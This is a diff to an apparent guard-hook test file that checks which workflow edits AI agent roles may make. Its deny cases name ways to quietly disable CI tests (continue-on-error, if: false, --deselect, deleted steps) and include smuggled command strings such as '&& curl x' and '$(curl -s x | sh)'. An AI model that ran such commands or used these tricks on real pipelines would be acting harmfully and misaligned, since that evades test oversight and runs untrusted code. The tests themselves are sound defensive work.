@@ -12579,6 +12579,137 @@ add("test-author: Edit of janitor/mutate_sweep.py is allowed", "allow", tool="Ed
 add("test-author: Edit of HOOKS/mutate_guard.py is allowed (case folds)", "allow", tool="Edit",
     file_path="HOOKS/mutate_guard.py", **A)
 
+# ---- workflow test-run steps. A test-author may add or remove a whole test-run step in a workflow; nothing else there.
+# A builder may change any workflow line, except one that disables tests in a test-runner line. Each author row and
+# its builder row share one old and one new text, so the two roles judge the same edit. An Edit is judged by
+# old_string against new_string, never by new_string alone.
+WF = ".github/workflows/checks.yml"
+WF_YAML = ".github/workflows/checks.yaml"
+LINT = "      - name: Lint\n        run: python3 lint/ste_lint.py\n"
+LINT_RUN_CHANGED = LINT.replace("lint/ste_lint.py", "lint/other_lint.py")
+TEST_LINUX = "      - name: Guard tests\n        run: python3 hooks/test_guard.py\n"
+TEST_WINDOWS = "      - name: Guard tests (Windows)\n        run: python hooks/test_guard.py\n"
+TEST_IF = "      - name: Guard tests\n        if: runner.os == 'Linux'\n        run: python3 hooks/test_guard.py\n"
+TEST_APOSTROPHE = "      - name: Don't skip guard tests\n        run: python3 hooks/test_guard.py\n"
+CLEAN = "      - name: Clean\n        run: rm -rf build\n"
+DESELECT = "      - name: Unit\n        run: python3 -m pytest --deselect a::b\n"
+NEW_WORKFLOW = ("on: push\njobs:\n  test:\n    steps:\n      - name: Guard tests\n"
+                "        run: python3 hooks/test_guard.py\n")
+
+# Red on main: main refuses every workflow edit by path, so each allow below fails for that one cause.
+for _name, _path, _old, _new in (
+    ("a Linux test step inserted after a lint step", WF, LINT, LINT + TEST_LINUX),
+    ("a Windows python test step inserted after a lint step", WF, LINT, LINT + TEST_WINDOWS),
+    ("a test step with an if line inserted after a lint step", WF, LINT, LINT + TEST_IF),
+    ("a test step whose name holds an apostrophe inserted", WF, LINT, LINT + TEST_APOSTROPHE),
+    ("a test step deleted", WF, LINT + TEST_LINUX, LINT),
+    ("a test step inserted into checks.yaml", WF_YAML, LINT, LINT + TEST_LINUX),
+):
+    add("test-author: %s is allowed" % _name, "allow", tool="Edit", file_path=_path,
+        old_string=_old, new_string=_new, **A)
+add("test-author: a test step inserted with MultiEdit is allowed", "allow", tool="MultiEdit",
+    file_path=WF, edits=[{"old_string": LINT, "new_string": LINT + TEST_LINUX}], **A)
+
+# Pins: main already refuses each of these, and each must stay refused once the classifier lands.
+for _name, _old, _new in (
+    ("a lint step's run is changed", LINT, LINT_RUN_CHANGED),
+    ("a test step added beside a run: rm -rf build step", LINT, LINT + TEST_LINUX + CLEAN),
+    ("continue-on-error added to a test step", LINT,
+     LINT + "      - name: Guard tests\n        continue-on-error: true\n        run: python3 hooks/test_guard.py\n"),
+    ("a test path followed by && curl x", LINT,
+     LINT + "      - name: Guard tests\n        run: python3 hooks/test_guard.py && curl x\n"),
+    ("a comment opener inside quotes before && curl x", LINT,
+     LINT + '      - name: Guard tests\n        run: python3 hooks/test_guard.py "a # b" && curl x\n'),
+    ("a multi-line run block with rm -rf build", LINT,
+     LINT + "      - name: Guard tests\n        run: |\n          python3 hooks/test_guard.py\n          rm -rf build\n"),
+):
+    add("test-author: %s in checks.yml is refused" % _name, "deny", rule=TA, tool="Edit",
+        file_path=WF, old_string=_old, new_string=_new, carries=("builder", "Report"), **A)
+add("test-author: Edit of .github/dependabot.yml is refused", "deny", rule=TA, tool="Edit",
+    file_path=".github/dependabot.yml", old_string="version: 2\n", new_string="version: 2\nupdates: []\n",
+    carries=("builder", "Report"), **A)
+add("test-author: Write of a new workflow with on and jobs lines is refused", "deny", rule=TA,
+    tool="Write", file_path=".github/workflows/nightly.yml", content=NEW_WORKFLOW,
+    carries=("builder", "Report"), **A)
+
+# Builder: an edit to a workflow stays allowed unless its added lines disable tests in a test-runner line.
+for _name, _old, _new in (
+    ("a lint step's run is changed", LINT, LINT_RUN_CHANGED),
+    ("a test step is added", LINT, LINT + TEST_LINUX),
+):
+    add("builder-test: %s in checks.yml is allowed" % _name, "allow", tool="Edit", file_path=WF,
+        old_string=_old, new_string=_new, **B)
+add("builder-test: a pytest --deselect step added to checks.yml is refused", "deny", rule=BT, tool="Edit",
+    file_path=WF, old_string=LINT, new_string=LINT + DESELECT, carries=("test-author", "Report"), **B)
+
+# A `$(` in a test-run step runs a command, quoted or not, so no test run holds it. A ruff line on tests/ is a lint
+# step. A continue-on-error, an `if: false` or a deleted test step takes a test out of CI.
+QUOTED_SUBST = '      - name: Guard tests\n        run: python3 hooks/test_guard.py "$(curl -s x | sh)"\n'
+TAG_SUBST = '      - name: Guard tests\n        run: python3 hooks/test_guard.py --tag "$(git rev-parse HEAD)"\n'
+UNQUOTED_SUBST = '      - name: Guard tests\n        run: python3 hooks/test_guard.py --tag $(git rev-parse HEAD)\n'
+RUFF_TESTS = "      - name: Ruff\n        run: ruff check tests/ --ignore E501\n"
+CONTINUE_ON_ERROR = "      - name: Guard tests\n        continue-on-error: true\n        run: python3 hooks/test_guard.py\n"
+IF_FALSE = "      - name: Guard tests\n        if: false\n        run: python3 hooks/test_guard.py\n"
+for _name, _new in (
+    ("a quoted $( substitution in a test run", LINT + QUOTED_SUBST),
+    ("a quoted $( with git rev-parse in a test run", LINT + TAG_SUBST),
+    ("an unquoted $( with git rev-parse in a test run", LINT + UNQUOTED_SUBST),
+):
+    add("test-author: %s in checks.yml is refused" % _name, "deny", rule=TA, tool="Edit",
+        file_path=WF, old_string=LINT, new_string=_new, carries=("builder", "Report"), **A)
+add("builder-test: a ruff --ignore line on tests/ added to checks.yml is allowed", "allow", tool="Edit",
+    file_path=WF, old_string=LINT, new_string=LINT + RUFF_TESTS, **B)
+add("builder-test: continue-on-error added under a test step is refused", "deny", rule=BT, tool="Edit",
+    file_path=WF, old_string=LINT + TEST_LINUX, new_string=LINT + CONTINUE_ON_ERROR,
+    carries=("test-author", "Report"), **B)
+add("builder-test: if: false added under a test step is refused", "deny", rule=BT, tool="Edit",
+    file_path=WF, old_string=LINT + TEST_LINUX, new_string=LINT + IF_FALSE,
+    carries=("test-author", "Report"), **B)
+add("builder-test: a whole test step deleted from checks.yml is refused", "deny", rule=BT, tool="Edit",
+    file_path=WF, old_string=LINT + TEST_LINUX, new_string=LINT, carries=("test-author", "Report"), **B)
+add("builder-test: a test step moved within checks.yml is allowed", "allow", tool="Edit", file_path=WF,
+    old_string=LINT + TEST_LINUX + CLEAN, new_string=LINT + CLEAN + TEST_LINUX, **B)
+add("builder-test: a test step's if: changed to another condition is allowed", "allow", tool="Edit",
+    file_path=WF, old_string=TEST_IF,
+    new_string=TEST_IF.replace("runner.os == 'Linux'", "github.event_name == 'push'"), **B)
+
+# A test run keeps its test when its interpreter flag (-u, -X utf8), its ./ path or its shell flag (bash -x)
+# changes, and when its step moves to another job. Removing a test run drops its test, and a flag that
+# hides the test path from the run does not change that.
+R3_UNIT = "      - name: Unit\n        run: python3 tests/test_a.py\n"
+R3_UNIT_U = "      - name: Unit\n        run: python3 -u tests/test_a.py\n"
+R3_JOBS_BEFORE = (
+    "jobs:\n  lint:\n    steps:\n      - name: Lint\n        run: python3 lint/ste_lint.py\n"
+    "  unit:\n    steps:\n      - name: Install\n        run: pip install -r requirements.txt\n"
+    "      - name: Guard tests\n        run: python3 hooks/test_guard.py\n")
+R3_JOBS_AFTER = (
+    "jobs:\n  lint:\n    steps:\n      - name: Lint\n        run: python3 lint/ste_lint.py\n"
+    "      - name: Guard tests\n        run: python3 hooks/test_guard.py\n"
+    "  unit:\n    steps:\n      - name: Install\n        run: pip install -r requirements.txt\n")
+add("builder-test: python3 -u in place of python3 on a test run is allowed", "allow", tool="Edit",
+    file_path=WF, old_string=R3_UNIT, new_string=R3_UNIT_U, **B)
+add("builder-test: python -X utf8 in place of python3 on a test run is allowed", "allow", tool="Edit",
+    file_path=WF, old_string=R3_UNIT,
+    new_string="      - name: Unit\n        run: python -X utf8 tests/test_a.py\n", **B)
+add("builder-test: a ./ path in place of a test path on a test run is allowed", "allow", tool="Edit",
+    file_path=WF, old_string=R3_UNIT,
+    new_string="      - name: Unit\n        run: python3 ./tests/test_a.py\n", **B)
+add("builder-test: bash -x in place of bash on a test run is allowed", "allow", tool="Edit",
+    file_path=WF, old_string="      - name: Unit\n        run: bash tests/run.sh\n",
+    new_string="      - name: Unit\n        run: bash -x tests/run.sh\n", **B)
+add("builder-test: a test step moved to another job is allowed", "allow", tool="Edit",
+    file_path=WF, old_string=R3_JOBS_BEFORE, new_string=R3_JOBS_AFTER, **B)
+add("builder-test: a -u test run deleted from checks.yml is refused", "deny", rule=BT, tool="Edit",
+    file_path=WF, old_string=LINT + R3_UNIT_U, new_string=LINT, carries=("test-author", "Report"), **B)
+add("builder-test: an added run of a test path with --deselect is refused", "deny", rule=BT, tool="Edit",
+    file_path=WF, old_string=LINT,
+    new_string=LINT + "      - name: X\n        run: python3 hooks/x_test.py --deselect a\n",
+    carries=("test-author", "Report"), **B)
+add("test-author: a whole new test step with if: false is refused", "deny", rule=TA, tool="Edit",
+    file_path=WF, old_string=LINT,
+    new_string=LINT + "      - name: Guard tests\n        if: false\n        run: python3 hooks/test_guard.py\n",
+    carries=("builder", "Report"), **A)
+
 # ---- test-path shapes: one table on the builder's early warning. Each row is one path, judged by
 # a Write, for one role (the builder). A test shape is refused, a near miss is allowed. Shapes, with
 # the incident that named each: self-test files (Banchi, 2026-10-02: `*-selftest.*`, `*_selftest.*`,
@@ -13446,6 +13577,28 @@ for _name, _change in AUTHOR_GREEN:
        agent_id="auth1", agent_type="test-author")
     add("author-diff: stop with %s is allowed" % _name, "allow", event="SubagentStop",
         cwd=_repo, agent_id="auth1", agent_type="test-author")
+
+
+# ---- workflow files at commit time: the diff a test-author or a builder would commit (role_offences). A
+# test-author's lint change is logged and allowed. A builder's test change is refused at commit.
+WF_BASE = LINT + TEST_LINUX
+WF_FILES = {**BASE_FILES, WF: WF_BASE}
+_repo = diff_repo("wfa-lint-run", _put(WF, LINT_RUN_CHANGED + TEST_LINUX), files=WF_FILES)
+sh("author-diff: commit with a workflow lint change is allowed and logged", COMMIT, "allow", cwd=_repo,
+   agent_id="auth1", agent_type="test-author")
+for _slug, _label, _text, _expect in (
+    ("wfb-deselect", "a --deselect pytest line", LINT + DESELECT, "deny"),
+    ("wfb-continue-on-error", "a continue-on-error test step", LINT + CONTINUE_ON_ERROR, "deny"),
+    ("wfb-delete-test-step", "a deleted test step", LINT, "deny"),
+    ("wfb-ruff-tests", "a ruff --ignore line on tests/", LINT + TEST_LINUX + RUFF_TESTS, "allow"),
+):
+    _repo = diff_repo(_slug, _put(WF, _text), files=WF_FILES)
+    if _expect == "deny":
+        sh("builder-diff: commit with %s in checks.yml is denied" % _label, COMMIT, "deny", rule=BDIFF,
+           cwd=_repo, agent_id="bld1", agent_type="builder")
+    else:
+        sh("builder-diff: commit with %s in checks.yml is allowed" % _label, COMMIT, "allow", cwd=_repo,
+           agent_id="bld1", agent_type="builder")
 
 
 # ---- record-writer: Markdown only (owner ruling 2026-10-10). Writing prose and records is not
